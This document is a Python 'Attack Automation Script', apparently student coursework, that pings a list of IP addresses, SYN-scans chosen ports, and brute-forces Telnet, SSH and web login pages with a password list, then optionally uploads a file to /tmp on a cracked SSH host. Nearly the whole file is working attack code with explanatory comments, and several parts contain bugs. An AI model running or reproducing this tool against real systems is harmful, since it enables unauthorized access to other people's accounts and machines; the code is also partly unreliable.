# Attack Automation Script
# CallumSteedman

from scapy.all import sr1, IP, ICMP, RandShort, TCP
import paramiko
from telnetlib import Telnet
import sys
import requests

# The help function can be seen below. This function is invoked when the user feeds the script the argument "-h".
# The text is wrapped in triple quotes to allow the string (program guide) to span multiple lines.
# At the end of the function the variable storing the program guide is printed to the screen for the user.

def help():
    parameters = '''
-h  Show tool manual.
-t  Define filename for file that contains list of IP addresses
-p  Specify ports to scan on target host.
-u  Specify Username.
-f  Define filename for file that contains list of passwords.
-l  Specify file you would like to transfer to server.

Example use includes the following:

python3 Attack-Automation-Script.py -t ips.txt -p 22,23 -u Administrator -f passwords.txt 
python3 Attack-Automation-Script.py -t ip_addresses.txt -p 25,23,43,1,2,3 -u Kevin -f pass.txt -l transfer.txt
python3 Attack-Automation-Script.py -t ip.txt -p 1,2,3,4,5,6,7,8,9 -u User -f pass.txt 
    '''
    print(parameters)


# The first function that shall convert the txt file containing IP addresses to a list can be seen below.
# The function is firstly fed through the txt file containing IP addresses, it then opens up a try loop taking in the text file and using the function read().splitlines() which shall store each concurrent line residing in the text file to a list which it will then return to the main function.
# Note this takes place in a try loop, so if an error occurs via the use of an exception is will be printed to the screen and the script will be exited.
def read_ip_list(ip_file):
    try:
        with open(ip_file) as f:
            content = f.read().splitlines()
            return content

    except Exception as e:
        print(str(e))
        sys.exit(0)

# The next function is to weed out non valid IPs from the users txt file.
# The function takes in the itteration of the ips contained in the list created in the read_ip_list function, then via the use of scapy, an icmp packet will be sent to to the ip in question, where a True will be returned if a reply is recieved, and a False if one is not recieved.
# Note this takes place in a try loop so if an error occurs, via the use of exception is will be printed to the screen and the script will be exited.
def is_reachable(ip):
    try:
        TIMEOUT = 2
        conf.verb = 0
        pack = IP(dst=ip, ttl=20) / ICMP()
        reply = sr1(pack, timeout=TIMEOUT)
        return True if reply else False
    
    except Exception as e:
        print(str(e))
        sys.exit(0)

# The next function is for the scanning of the users inputted ports.
# The function takes in the itteration of the IP list, as well as the port list created in the main function and uses the scapy module to create and send a SYN packet to the IP in question and then stores the response. If 0x12 (hex for SYN ACK) resides in the response, it means the port is up and a True is returned, otherwise the port is down and a False is returned.
# Again note this takes place in a try loop, so if an error occurs via the use of exception it will be printed to the screen and the script will be exited.
def scan_port(ip, port):
    try:
        srcport = RandShort()
        tcp_connect_scan_resp = sr1(IP(dst=str(ip)) / TCP(sport=srcport, dport=port, flags="S"), timeout=10)
        return True if tcp_connect_scan_resp.getlayer(TCP).flags == 0x12 else False
        
    except Exception as e:
        print(str(e))
        sys.exit(0)

# The telnet brute force function resides below.
# The function takes the IP which has the telnet service open, the telnet port which is 23, the username and the password txt file.
def bruteforce_telnet(ip, port, username, password_list_filename):
    # We firstly call a function which shall allow us to encode to the language required by telnet, which is 'ascii'
    def enc(s):
        return s.encode("ascii")

    # A with loop is then opened, which shall itterate through the passed password txt file and will save each new line as an element of a list, which resides in a variable called passwords. (Note this takes place in a try loop that shall detect incorrect input and will inform the user whilst exiting the script.)
    try:
        with open(password_list_filename) as f:
            passwords = f.read().splitlines()
    except:
        print('Problem with password file sorry!')
        sys.exit(0)

    # The ip address of the server in question is saved in string format in a variable called 'server', the username is stored in string format in a variable called 'username'.
    server = str(ip)
    username = str(username)
    # A for loop is then opened, which shall itterate through the password list, and via the use of the telnetlib module we will communicate with the telnet service residing on the server in question.
    # Note once we open the telnet service via the IP and the port 'tel = Telnet(server, port)' we have to communicate as if we are actually in the console so note the strings and the specification to go down a line via tel.write(enc(username + "\n")) 
    try:
        for i in passwords: 
            tel = Telnet(server, port)
            tel.read_until(enc("login:"))
            tel.write(enc(username + "\n"))
            tel.read_until(enc("Password:"))
            tel.write(enc(i + "\n"))
            # The service will keep looping through the process until a correct password is found where telnet prints the message  'Welcome to' detected by 'data = tel.read_until(enc("Welcome to"), timeout=1)' otherwise all other passwords shall be itterated through even if one doesnt work, note the ascii specification.
            data = tel.read_until(enc("Welcome to"), timeout=1)
            data = data.decode("ascii")
            # If 'welcome to' was in the data variable it means a matching combo was found so True,  a variable containing the working username and password, the working username and password are returned to the main function and the session is ended, otherwise the script continues.
            if ("Welcome to" in data):
                combo1 = "Success! Username: " + username + " Password: " + i
                user1 = username 
                password1 = i
                tel.write(enc("exit\n"))
                return True,combo1,user1,password1 

        # This else condition is triggered if all possible passwords are attempted and triggers the informing of the user in the main function.     
        else:
            return ('1')
    # This else condition is triggered if an error whilst bruteforcing occurs and triggers the informing of the user in the main function.        
    except:
        return ('1')


  

# The SSH brute force function resides below.
# It takes the IP which has the SSH service open, the SSH port which is 22, the username and the password txt file.
def bruteforce_ssh(ip, port, username, password_list_filename):
    # A with loop is opened which shall itterate through the password txt file and save each new line as an element of a list, which resides in a variable called passwords.(Note this takes place in a try loop that shall detect incorrect input and will inform the user whilst exiting the script.)
    try:
        with open(password_list_filename) as f:
            passwords = f.read().splitlines()
    except:
        print('Problem with password file sorry!')
        sys.exit(0)


    # The missing host key policy AutoAddPolicy adds keys to this set and saves them, which is important when attempting to connect to a previously-unknown SSH server.
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # A for loop is opened which shall itterate through the password list.
    for password in passwords:
        # A Try loop is then opened up to handle the different scenarios which may arise when attempting to bruteforce. Firstly the passed IP, the username, the password being itterated through and a timeout are passed to the paramiko function '.connect'.
        try:
            ssh.connect(ip, username=username, password=password, banner_timeout=200)

        # This specifies for the function to continue if the combo in question doesnt work, eventually running out of combos and invoking the else condition that shall trigger the informing of the user in the main function.
        except paramiko.AuthenticationException:
            continue

        # This handles the scenario where the SSH server is overwhelmed with attempts and returns a '2' string that shall inform the main function to continue, whilst informing the user of the issue and closing the SSH connection.
        except paramiko.SSHException:
            print('Too many attempts, sorry!')
            ssh.close()
            return ('2')
            continue

        # The only other option is a succesful login attempt, so the else condition triggers a variable containing the working username and password, the working username and password to be returned to the main function and the session is ended.
        else:
            combo2 = "Success! Username: " + username + " Password: " + password
            user2 = username
            password2 = password
            return True,combo2,user2,password2
            ssh.close()

    #This else condition is triggered if all possible passwords are attempted and triggers the informing of the user in the main function.     
    else:
        return ('1')    



#Below the function which shall attempt to bruteforce a web page can be found.
def bruteforce_web(ip, port, username, password_list_filename):
    # A with loop is opened which shall itterate through the password txt file and save each new line as an element of a list, which resides in a variable called passwords.(Note this takes place in a try loop that shall detect incorrect input and will inform the user whilst exiting the script.)
    try:
        with open(password_list_filename) as f:
            passwords = f.read().splitlines()
    except:
        print('Problem with password file sorry!')
        sys.exit(0)
    # We start off by creating the web address in string format which we shall attempt to connect to if the ports are either 80, 8080 or 8888. To accomplish this we take in the fed through IP as well as the port in string format, and add 'http://' and ':' to either side of it. We then open up a try loop to catch any errors that may arise.
    url = 'http://' + ip + ':' + str(port) 
    try:
        # We start off by sending a http get request to the url created earlier which could look like 'http://10.0.0.1:80' for example and if the response equals a status code of 200 the website returned communication and we can continue, otherwise it is offline and the function is exited with a message informing the user of the error via the else condition found below.
        response1 = requests.get(url)
        if response1.status_code == 200:
            # If the main website is online, we change up the url to go to the login page which is accomplished by adding '/login.php/' to the previous url and we send the same get request to see if a response is received and from the status code that is returned, gauge whether to leave the function with a message informing the user via the else condition or to continue on.
            login_url = 'http://' + ip + ':' + str(port) + '/login.php/'
            response2 = requests.get(login_url)    
            if response2.status_code == 200:
                # if the website is online we open up a for loop to itterate through the password list and send a post containing the username as well as the itteration of passwords in the specified insertion format'username':username,'password':p 
                for p in passwords:
                    data = {'username':username,'password':p}
                    r = requests.post(url,data=data)
                    # Next an if condition is utilised to gauge whether the login worked or not, if the string 'Login failed' resides in the variable holding the response the password failed, otherwise the credentials worked and the the True condition as well as a variable containing a message showing the working combo of username and password is returned to the main function. 
                    if "Login failed" in str(r):
                        continue
                    else:
                        combo3 = "Success! Username: " + username + " Password: " + p
                        return True,combo3

                #This else condition is triggered if all possible passwords are attempted and triggers the informing of the user in the main function.  
                else:
                    return ('1')

            else:
                print('No option to login exists, sorry.')
                return
        else:
            print('Web site does not exist.')
            return

    except Exception as e:
        print(e)
        print('There was seemingly an error contacting website, sorry!')
        return


#The main function starts off by processing the user inputted argements inserted alongside the script via 'args = sys.argv' storing the input as a list.
def main(argv):
        args = sys.argv
    # Next an if condition is opened and the presence of the string '-h' and the length of the list is looked for/checked, if both conditions are met the user wants tp trigger the help command, so the help function containing a guide on how to use the script is called and the script is exited.
        if '-h' in args and len(args) == 1:
            help()
            sys.exit(0)
    # As besides just the help argument being called with this script, there is only two other ways to call the script, which is by providing the ip list, the ports, the user and the password list as well as potentilly the file to transfer. With the combined length of all arguments including the contents being either len(9) or len(11) (depending on if the '-l' condition is called or not) the script continues, otherwise it indicates incorrect usage and the help function is invoked as well as the exiting of the script.
        elif '-t' in args and '-p' in args and '-u' in args and '-f' in args and len(args) == 9 or '-t' in args and '-p' in args and '-u' in args and '-f' in args and '-d' and len(args) == 11: 
            # If the above conditions are met a try loop is then opened and the script continues, as well as a message being printed to the screen informing the user to be patient while the script is running.
            try:
                print('The IPs and ports are being processed, allow up to 15 seconds for output!')
            # Firstly the ip address txt file found at sys.argv[2] is passed through to the read_ip_list function which takes the txt ip address file and returns the ips in a list which is stored as a variable called ips.
            # The contents of the list containing the ips are then passed to the is_reachable function mentioned earlier via a for loop which returns True or False depending on the response garnered from the ip in question. if True is returned the IP is valid and stays in the list, otherwise if a False is returned the ip is removed from the list via ips.remove. 
            # Note the for loop opens the ip list with a semicolon and two brackets 'for t in ips[:]:'. Which essentially itterates through a carbon copy of the ips list and allows us to itterate through the actual list without encountering any issues which may occur by actively looping through a list whilst itterating it (removing elements) at the same time.
                ips = read_ip_list(sys.argv[2])
                for t in ips[:]:
                    if is_reachable(t) is True:
                        pass
                    else:
                        ips.remove(t)
            
                # Next we take the argument containing the ports found after the -p parameter and save it in a variable called ports, note the input takes commas so we shall have to remove these commas so the ports can be processed. 
                # This is accomplished by creating another variable called port_str changing the previous variable to string format and then creating a list called listl1 which allows us to split the ports seperated by commas via 'str.split(",")'. So say if the user inputted 23,22,21 it now looks like '23' '22' '21' (note this is engulfed in a try loop that shall identify if there is an issue with the port input, printing a message and exiting the script if this is the case).
                # Then an empty list called port_list is opened and a for loop  is opened to serve the purpose of itterating through the list containing the port input, and the contents of this list are added to the list via port_list.append(int(i)) which shall add the ports in int format which is necessary for scapy to process them.(note this is engulfed in a try loop that shall identify if there is an issue with the port input, printing a message and exiting the script if this is the case). 
                ports = args[args.index("-p") + 1]
                port_str = str(ports)
                try:
                    listl = port_str.split(",")
                except:
                    print('Problem processing ports check input.')
                    sys.exit(0)
                    
                port_list = []
                try:
                    for i in listl:
                        port_list.append(int(i))
                except:
                    print('Problem processing ports check input.')
                    sys.exit(0)

            # Next it is necessary to take the argument containing the username found after the -u argument and save it in a variable called user which is then stored in string format in another variable called username.
                user = args[args.index("-u") + 1]
                username = str(user)

                # Three small error catching features reside here that shall trigger the exiting of the script if the IPs list is empty (indicating no responding IPs) or if the port list is empty indicating incorrect script usage or if the username variable is empty, indicating incorrect script usage.
                if not ips:
                    print('No valid IP in list, sorry!')
                    sys.exit(0)

                if not port_list:
                    print('Issue with port input, sorry!')
                    sys.exit(0)
                                      
                if username == "":
                    print('Check inputted username.')
                    sys.exit(0)


            # Now it is necessary to actively pass the IPs and the ports to the port scan function. This is accomplished by a for loop contained in another for loop and then a variable called result is opened. 
            # This variable shall save the return from the passing of both lists contents via scan_port(i, p), so basically an IP will be passed and then each port will be scanned on said IP and the process is repeated for each IP that is passed through to it.
                for i in ips:
                    for p in port_list:
                        result = scan_port(i, p)        

                        # If the port scan function returns True it means the port has acknowledged the SYN meaning it is open, while if the port is 23 it means the telnet service is up, so the ip address and port are then printed to the screen along with the text confirming the port is open and login will be attempted.
                        # While the IP address in string format along with the port number (23), username variable and the argument where the password list resides are passed to the bruteforce_telnet() function and saved in a variable called brutetel.
                        if result == True and p == 23:
                            print('IP Address ', str(i), ' with port ', str(p), ' is open attempting login')
                            brutetel = bruteforce_telnet(i, p, username, sys.argv[8])
                            # If the first element of the returned list of contents is True via 'if 'brutetel[0] == True:' it means a password and username was found, and the returned variable containing the matching combo is printed to the screen via 'print (brutetel[1])'.
                            if brutetel[0] == True:
                                print (brutetel[1])
                                # As a further potential feature was the option for a user to input -l containing a file to transfer to the server if the combo was found and the '-l' feature was utilised, the list elements containing the working telnet username and the password were also returned.
                                # This was to login to the telnet service and pass the file, but I could not work out how to transfer the file over the Telnet service so I left it there :(.
                                if '-l' in args and brutetel[0] == True:
                                    workinguser1 = brutetel[2]
                                    workingpass1 = brutetel[3]

                            # The else condition below takes care of the condition of no working combo being found and informs the user whilst continuing the script.
                            else:
                                print('No working username and password combo was found sorry.')
                                continue
                        
         
                        # If the return = True it means the port has acknowledged the SYN meaning it is open and if the port is 22 it means the SSH service is up, so the ip address and port are then printed to the screen along with the text confirming the port is open and login will be attempted.
                        # While the ip address in string format along with the port number (22), username variable and the argument where the password list resides are passed to the bruteforce_ssh() function and saved in a varibale called brutessh.
                        elif result == True and p == 22:
                            print('IP Address ', str(i), ' with port ', str(p), ' is open attempting login.')
                            brutessh = bruteforce_ssh(i, p, username, sys.argv[8])
                             # If the first element of the returned list of contents is True via 'if 'brutessh[0] == True:' it means a working password and username  was found, and the returned variable containing the matching combo is printed to the screen via 'print (brutessh[1])'.
                            if brutessh[0] == True:
                                print (brutessh[1])
                                # Next a try loop function is opened to begin the attempting of a file transfer over the SSH connection and potentially catch any errors that may arise, informing the user the file transfer failed.
                                try:    
                                    # As a further potential feature was the option for a user to input -l containing a file to transfer to the server if the combo was found and the '-l' feature was utilised, the list elements containing the working SSH username and the password were also returned.
                                    if '-l' in args and brutessh[0] == True:
                                            workinguser2 = brutessh[2]
                                            workingpass2 = brutessh[3]
                                            # The connection is established with the username and poassword we already know via the paramiko function client.connect(i, username= workinguser2, password= workingpass2).
                                            client = paramiko.SSHClient()
                                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                            client.connect(i, username= workinguser2, password= workingpass2)
                                            # Below the setting up of the sftp connection takes place, and the file found at sys.argv[8] is passed to the tmp/ directory on the server via stfp.put 'sftp.put(sys.argv[11], '/tmp')'.
                                            # The transfer is ended via sftp.close() and a message informing the user that the file was transferred is printed to the screen.
                                            sftp = client.open_sftp()
                                            sftp.put(sys.argv[11], '/tmp')
                                            sftp.close()
                                            print ('The file of your choice' + str(sys.argv[8]) + 'has been copied to the server that resides at IP' + i)

                                # Except condition below is triggered if the file transfer failed .   
                                except Exception:
                                    print('There was an error copying your file to the server, sorry.')

                            # The elif condition below is triggered if too many attempts are made to the server  and the script is made carry on.       
                            elif brutessh == '2':
                                continue

                            # The else condition below is triggered if no working combo is found and informs the user whilst continuing the script.
                            else:
                                print('No working username and password combo was found sorry.')
                                continue

                        # If the return = True it means the port has acknowledged the SYN meaning it is open and if the port is 80 it means the web service is up, so the IP address and port are then printed to the screen along with text confirming it is open and login will be attempted.
                        # While the IP address in string format along with the port number (80), username variable and the argument where the password list resides are passed to the bruteforce_web() function and saved to a variable called bruteweb1.
                        elif result == True and p == 80:
                            print('IP Address ', str(i), ' with port ', str(p), ' is open attempting login.')
                            bruteweb1 = bruteforce_web(i, p, username, sys.argv[8])
                            # If the first element of the returned list of contents is True if 'bruteweb1[0] == True:' it means a working password and username was found, and the returned variable containing the matching combo is printed to the screen via print (bruteweb1[1]) otherwise the script continues.
                            if bruteweb1[0] == True:
                                print (bruteweb1[1])
                            # The else condition below takes care of the scenario of no working combo being found and informs the user whilst continuing the script.
                            else:
                                print('No working username and password combo was found sorry.')
                                continue

                        # If the return = True it means the port has acknowledged the SYN meaning it is open and if the port is 8080 it means the web service is up, so the IP address and port are then printed to the screen along with the text confirming it is open and login will be attempted.
                        # While the IP address in string format along with the port number (8080), username variable and the argument where the password list resides are passed to the bruteforce_web() function and saved to a variable called bruteweb2.
                        
                        elif result == True and p == 8080:
                            print('IP Address ', str(i), ' with port ', str(p), ' is open attempting login.')
                            bruteweb2 = bruteforce_web(i, p, username, sys.argv[8])
                            # If the first element of the returned list of contents is True if 'bruteweb2[0] == True:' it means a working password and username was found, and the returned variable containing the matching combo is printed to the screen via print (bruteweb2[1]) otherwise the script continues.
                            if bruteweb2[0] == True:
                                print (bruteweb2[1])
                            # The else condition below takes care of the scenario where no working combo is found and informs the user whilst continuing the script.
                            else:
                                print('No working username and password combo was found sorry.')
                                continue

                        # If the return = True it means the port has acknowledged the SYN meaning it is open and if the port is 8888 it means the web service is up, so the IP address and port are then printed to the screen along with text confirming it is open and login will be attempted
                        # While the IP address in string format along with the port number (8888), username variable and the argument where the password list resides are passed to the bruteforce_web() function and saved in a varibale called bruteweb3.
                        elif result == True and p == 8888:
                            print('IP Address ', str(i), ' with port ', str(p), ' is open attempting login.')
                            bruteweb3 = bruteforce_web(i, p, username, sys.argv[8])
                            # If the first element of the returned list of contents is True if 'bruteweb3[0] == True:' it means a working password and username combo was found, and the returned variable containing the matching combo is printed to the screen via print (bruteweb3[1])
                            if bruteweb3[0] == True:
                                print (bruteweb3[1])
                            # The else condition below takes care of the scenario of no working combo being found and informs the user whilst continuing the script.
                            else:
                                print('No working username and password combo was found sorry.')
                                continue

                        # If the return = True it means the port has acknowledged the SYN meaning it is open, so the IP address and port are then printed to the screen along with text confirming it is open.
                        elif result == True:
                            print('IP Address ', str(i), ' with port ', str(p), ' is open')

                        # If the return = False it means the port has not acknowledged the SYN meaning it is closed, so the IP address and port are then printed to the screen along with text confirming it is closed.
                        elif result == False:
                            print('IP Address ', str(i), ' with port ', str(p), ' is closed.')

                          
                        # Any other output is irrelevant so it is just passed.
                        else:
                            pass
        
        # If an issue occurs the exception is printed to the screen followed by the help menu indicating proper usage.
            except Exception as e:
                print(e)
                help()
                sys.exit(0)
    
    #Any error from within this try loop indicated incorrect use, so the help function is called and the program is exited.
        else:
            help()
            exit()


# This serves the purpose of defining the specific behaviour expected when calling the script, with arguments to be passed to it 'main(sys.argv[1:])' with a try and except loop used to catch when the program is interrupted by the users keyboard 'KeyboardInterrupt' ie ctrl+c.
if __name__ == '__main__':
    try:
        main(sys.argv[1:])
    except KeyboardInterrupt:
        print('Received quit signal.')
        sys.exit(0)
